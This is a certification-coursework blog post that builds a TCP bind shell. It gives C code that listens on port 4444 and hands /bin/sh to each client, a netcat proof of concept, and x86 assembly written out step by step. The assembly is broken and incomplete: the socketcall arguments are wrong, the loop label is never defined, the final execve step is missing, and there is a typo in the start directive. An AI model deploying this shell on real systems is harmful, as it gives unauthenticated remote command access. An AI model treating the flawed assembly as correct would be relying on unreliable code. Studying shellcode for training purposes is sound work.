---
title:  "SLAE x86 Assignment 1: TCP Bind Shellcode"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### TCP Bind Shellcode
------

* Binds to a port
* Executes a shell on an incoming connection
* Port number should be easily configurable

#### Concept 
-----

A TCP bind shellcode will bind a shell to a specific network port on a host listening for an incoming connection via the TCP protocol.

![Bind Shell](/assets/images/bind_shell.png)

Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT preventing unsolicited incoming connections (except for certain ports/well known services). This limits the target host's exposure and will prevent a port-binding shellcode from receiving a successful connection.

#### TCP Bind Shell in C
--------

The following C skeleton code will be used to demonstrate the TCP bind shell from a high-level language perspective. 

This will be used as a template for the low-level assembly code to follow:

```c
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;  // socket for host  
int client_sockid;  // socket for client  
      
struct sockaddr_in hostaddr;  // sockaddr struct  
  
int main()  
{  
    // 1st syscall - create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Create sockaddr struct 
    hostaddr.sin_family = AF_INET;  // consists of AF_INET
    hostaddr.sin_port = htons(4444);  // bind socket using port 4444  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  // listen on any interface
  
    // 2nd syscall - bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // 3rd syscall - listen for incoming connections  
    listen(host_sockid, 2);  
  
    // 4th syscall - accept incoming connections    
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // 6th syscall - executes /bin/sh using execve  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
```

Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:

* socket
* bind
* listen
* accept
* dup2
* execve

The syscalls in the C code relate to the socket network access protocol as referenced below in the Linux master header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/linux/net.h 

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

A socket is defined in the man pages with domain, type and protocol arguments:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man socket

SOCKET(2)                              Linux Programmer's Manual                             SOCKET(2)

NAME
       socket - create an endpoint for communication

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);

DESCRIPTION
       socket() creates an endpoint for communication and returns a descriptor.

       The  domain  argument  specifies a communication domain; this selects the protocol family which
       will be used for communication.  These families are defined in <sys/socket.h>.   The  currently
       understood formats include:

       Name                Purpose                          Man page
       AF_UNIX, AF_LOCAL   Local communication              unix(7)
       AF_INET             IPv4 Internet protocols          ip(7)
```

The C code achieves the following objectives:

* Creates a socket
* Binds the socket to a port
* Configures the socket to listen for incoming connections
* Accepts connections on the created socket
* Redirects STDIN, STDOUT, and STDERR to the incoming client connection
* Executes a shell

#### POC 
------

The C code is compiled and executed demonstrating a successful bind connection and shell on the local host via port 4444:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc shell_bind_tcp.c -o shell_bind_tcp
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp 

osboxes@osboxes:~$ netstat -ano | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      off (0.00/0/0)
osboxes@osboxes:~$ nc 127.0.0.1 4444
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### TCP Bind Shell in Assembly
--------------

Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves which sets their values to '0':

```nasm
	; initialize registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```

#### 1st Syscall (Create Socket)
----

To create the socket syscall, a value is needed in the EAX register to call socket:

```bash 
osboxes@osboxes:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall	102
```

The header file reveals the code for socket is 102. Converting 102 from decimal to hex equates to the hex equivalent of 0x66, this value will be placed in the lower half of EAX (avoid Null Bytes with padding).

The next values are that of the socket properties defined earlier with the man pages, the integer values for type (SOCK_STREAM) and domain (AF_INET/PF_INET) can be found in the socket header file:

```bash
osboxes@osboxes:~$ cat /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define	PF_INET		2	/* IP protocol family.  */
```

The last argument value for int protocol is going to be ‘0’ to accept any protocol according to the man pages definition for socket. 

The registers would show the following at this stage:

* EBX == 0x02
* ECX == 0x01
* EDX == 0x00

The EDX register was already cleared when initialized, the zero value is set and does not require any change.

The socket syscall is executed with int 0x80 which creates the socket in the program, passing control to the interrupt vector in order to handle the socket syscall:

```nasm
	int 0x80       ; call the interrupt to create the socket, execute the syscall
```

The newly created socket can be identified by storing the value of EAX into the EDI register as reference for a later stage (with the ability to use EAX in subsequent system calls):

```nasm
	mov edi, eax   ; move the value of eax into edi for later reference
```

1st Syscall (Assembly code section):

```nasm
	; 1st syscall - create socket
	mov al, 0x66    ; hex value for socket
	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h
	int 0x80        ; create the socket, execute the syscall 
	mov edi, eax    ; move the value of eax into edi for later reference
```

#### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)
-----

To bind a port to the newly created socket, the EAX register will need to be cleared out using the XOR operation. 

The next instruction set moves the hex value for the socket function into the lower half of EAX which is required for the bind syscall:

```nasm
	xor eax, eax
	mov al, 0x66	; hex value for socket
```

The definition of the bind syscall function in the man pages describes the arguments required:

```bash
BIND(2)                                Linux Programmer's Manual                               BIND(2)

NAME
       bind - bind a name to a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);

DESCRIPTION
       When  a socket is created with socket(2), it exists in a name space (address family) but has no
       address assigned to it.  bind() assigns the address specified to by addr to the socket referred
       to  by the file descriptor sockfd.  addrlen specifies the size, in bytes, of the address struc-
       ture pointed to by addr.  Traditionally, this operation  is  called  "assigning  a  name  to  a
       socket".
```

The 3 arguments required:

* int sockfd - a reference to the newly created socket (EAX was moved into EDI)
* const struct sockaddr *addr – a pointer to the location on the stack of the sockaddr struct to be created
* socklen_t addrlen – the length of an IP socket address is 16 according to the header file /usr/include/linux/in.h

The sockfd argument can be set by moving the value of EDI into EBX, this was originally the value of socket:

```nasm
	mov ebx, edi    ; move the value of edi (socket) into ebx
```

The structure for handling internet addresses can be viewed via man pages for the header file:

```bash
cat /usr/include/netinet/in.h

/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
struct sockaddr_in {
  __kernel_sa_family_t	sin_family;	/* Address family		*/
  __be16		sin_port;	/* Port number			*/
  struct in_addr	sin_addr;	/* Internet address		*/
```

4 structures can be defined:

* AF_INET (Address family)
* Port Number
* Internet address
* 0 (choose an unused port at random)

Since the stack grows from High to Low memory it is important to remember to place these arguments onto the stack in reverse order.

The chosen port number will need to be converted from decimal (4444) to hex (115C), which equates to 0x5c11 in Little Endian format.

The Internet address will be set to 0.0.0.0 (opens bind port to all interfaces) and pushed onto the stack with the value of ECX.

The chosen port number is then pushed onto the stack as the next argument. The word value 0x5c11 relates to port number 4444 in Little Endian format. 

Finally the word value of 0x02 is pushed onto the stack which loads the value for AF_INET executing the syscall, which completes the creation of sockaddr struct:

```nasm
	xor ecx, ecx
	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push word 0x5c11; bind port 4444 is set
    	push word 0x02	; AF_INET
```    
    
Move the ESP stack pointer (top of the stack) into the ECX register to store the const struct sockaddr *addr argument. 

The value of 16 (sizeof function) will be moved into the low part of the EDX register.

Followed by an instruction to call the interrupt to execute the bind syscall:

```nasm
    	mov ecx, esp	; move esp into ecx, store the const struct sockaddr *addr argument
    	mov dl, 16	; move the value of 16 into edx
    	int 0x80	; call the interrupt to execute the bind syscall
```

2nd Syscall (Assembly code section):

```nasm
	; 2nd syscall - bind socket to IP/Port in sockaddr struct 
	xor eax, eax
	mov al, 0x66	; hex value for socket
	mov ebx, edi    ; move the value of edi (socket) into ebx
	xor ecx, ecx
	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push word 0x5c11; bind port 4444 is set
    	push word 0x02	; AF_INET
    	mov ecx, esp	; move esp into ecx, store the const struct sockaddr *addr argument
    	mov dl, 16	; move the value of 16 into edx
    	int 0x80	; call the interrupt to execute the bind syscall
```

#### 3rd Syscall (Listen for Incoming Connections)
----

The listen syscall works by preparing the bind socket to listen for incoming connections. 

The man pages defines the arguments required for the listen syscall:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man listen

LISTEN(2)                              Linux Programmer's Manual                             LISTEN(2)

NAME
       listen - listen for connections on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);

DESCRIPTION
       listen()  marks the socket referred to by sockfd as a passive socket, that is, as a socket that
       will be used to accept incoming connection requests using accept(2).

       The sockfd argument is a file descriptor that  refers  to  a  socket  of  type  SOCK_STREAM  or
       SOCK_SEQPACKET.

       The  backlog  argument defines the maximum length to which the queue of pending connections for
       sockfd may grow.  If a connection request arrives when  the  queue  is  full,  the  client  may
       receive  an  error  with  an indication of ECONNREFUSED or, if the underlying protocol supports
       retransmission, the request may be ignored so that a later reattempt at connection succeeds.
```

The 3 required arguments would result in:

* listen - EAX
* sockfd - EBX (reference of socket initially stored in EDI)
* backlog - ECX == 0 (accept first incoming connection)

The listen syscall begins with its code value of 363, converting from decimal to hex equals 0x16b:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen
#define __NR_listen 363 
```

The EAX register is cleared to store the listen syscall value into the lower memory region:

```nasm
	xor eax, eax	
    	mov ax, 0x16b	; syscall for listen moved into eax
```

The stored socket value from the EDI register is moved into the EBX register. 

The ECX memory register is then cleared, the  program interrupt is called and the listen syscall is executed:

```nasm
	mov ebx, edi	; move value of socket stored in edi into ebx
   	xor ecx, ecx	
    	int 0x80	; call the interrupt to execute the listen syscall
```

3rd syscall (Assembly code section):

```nasm
	; 3rd syscall - listen for incoming connections 
	xor eax, eax	
    	mov ax, 0x16b	; syscall for listen moved into eax
	mov ebx, edi	; move value of socket stored in edi into ebx
   	xor ecx, ecx	
    	int 0x80	; call the interrupt to execute the listen syscall
```

#### 4th Syscall (Accept Incoming Connections)
----

The accept4 syscall begins with its code value of 364, converting from decimal to hex equals 0x16c:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep accept
#define __NR_accept4 364
```

The EAX register is cleared to store the accept4 syscall value into the lower memory region:

```nasm
	xor eax, eax
   	mov ax, 0x16c	; syscall for accept4 moved into eax
```

The accept syscall is defined by the man pages as follows:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man accept

ACCEPT(2)                              Linux Programmer's Manual                             ACCEPT(2)

NAME
       accept - accept a connection on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <sys/socket.h>

       int accept4(int sockfd, struct sockaddr *addr,
                   socklen_t *addrlen, int flags);

DESCRIPTION
       The  accept()  system  call  is used with connection-based socket types (SOCK_STREAM, SOCK_SEQ-
       PACKET).  It extracts the first connection request on the queue of pending connections for  the
       listening  socket,  sockfd,  creates  a new connected socket, and returns a new file descriptor
       referring to that socket.  The newly created socket is not in the listening state.  The  origi-
       nal socket sockfd is unaffected by this call.
```
EBX will contain the reference of socket initially stored in EDI. 

The next 3 arguments can all equal '0' according to the man pages definition of accept.

The 4 arguments required for accept4:

* sockfd - EBX (reference of socket initially stored in EDI)
* addr - ECX == 0
* addrlen - EDX == 0
* flags - ESI == 0

The reference of socket is moved into EBX, with the remaining 3 argument values equal to '0' with their respective XOR operations.

The program interrupt is then called which executes the accept syscall:

```nasm
	mov ebx, edi    ; reference in stored EDI
	xor ecx, ecx    ; addr = 0
	xor edx, edx    ; addrlen = 0
	xor esi, esi    ; flags = 0
	int 0x80	; call the interrupt to execute accept syscall
```

The socket value stored in EDI is then set to '0' with an XOR operation. 

The RETURN VALUE defined in the man pages for accept4 describes a new sockfd value returned after the accept syscall is executed, this return value can be moved into EDI as with the previous sockfd value:

```nasm
	xor edi, edi    ; zeroize socket value stored in edi
	mov edi, eax    ; save return value from eax into edi	
```

4th syscall (Assembly code section):

```nasm
	; 4th syscall - accept incoming connections 
	xor eax, eax
   	mov ax, 0x16c	; syscall for accept4 moved into eax
	mov ebx, edi    ; reference in stored EDI
	xor ecx, ecx    ; addr = 0
	xor edx, edx    ; addrlen = 0
	xor esi, esi    ; flags = 0
	int 0x80	; call the interrupt to execute accept syscall
	xor edi, edi    ; zeroize socket value stored in edi
	mov edi, eax    ; save return value from eax into edi		
```

#### 5th Syscall (Duplicate File Descriptors for STDIN, STDOUT and STDERR)
------

The dup2 syscall works by creating a loop and iterating 3 times to accomodate all 3 file descriptors loading into the accepted connection (providing an interactive bind shell session).

To redirect IO to the descriptor, a loop is initiated with the ECX register, commonly known as the counter register. 

The syscall code can be found in the header file below, converting 63 from decimal to hex equals 0x3f:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2 
#define __NR_dup2 63
```

The dup2 syscall code of 63 is moved in the lower part of the EAX memory region.

All required arguments of dup2 are in sockfd (stored in accept syscall), which will be moved to EDI.

Whilst the zero flag is not set (JNZ) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0):

5th syscall (Assembly code section):

```nasm
	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
 	xor eax, eax   
   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
   	dec cl          ; decrement cl by 1
   	int 0x80	; call interrupt to execute dup2 syscall
    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
```

#### Assembly Code
-------------

````nasm
global_start

section .text
_start: 

	; initialize registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; 1st syscall - create socket
	mov al, 0x66    ; hex value for socket
	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h
	int 0x80        ; call the interrupt to create the socket, execute the syscall 
	mov edi, eax    ; move the value of eax into edi for later reference
	
	; 2nd syscall - bind socket to IP/Port in sockaddr struct 
	xor eax, eax
	mov al, 0x66	; hex value for socket
	mov ebx, edi    ; move the value of edi (socket) into ebx
	xor ecx, ecx
	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push word 0x5c11; bind port 4444 is set
    	push word 0x02	; AF_INET
    	mov ecx, esp	; move esp into ecx, store the const struct sockaddr *addr argument
    	mov dl, 16	; move the value of 16 into edx
    	int 0x80	; call the interrupt to execute the bind syscall
	
	; 3rd syscall - listen for incoming connections 
	xor eax, eax	
    	mov ax, 0x16b	; syscall for listen moved into eax
	mov ebx, edi	; move value of socket stored in edi into ebx
   	xor ecx, ecx	
    	int 0x80	; call the interrupt to execute the listen syscall
	
	; 4th syscall - accept incoming connections 
	xor eax, eax
   	mov ax, 0x16c	; syscall for accept4 moved into eax
	mov ebx, edi    ; reference in stored EDI
	xor ecx, ecx    ; addr = 0
	xor edx, edx    ; addrlen = 0
	xor esi, esi    ; flags = 0
	int 0x80	; call the interrupt to execute accept syscall
	xor edi, edi    ; zeroize socket value stored in edi
	mov edi, eax    ; save return value from eax into edi	
	
	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
 	xor eax, eax   
   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
   	dec cl          ; decrement cl by 1
   	int 0x80	; call interrupt to execute dup2 syscall
    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
````

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: SLAE-xxxx

Github Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment1
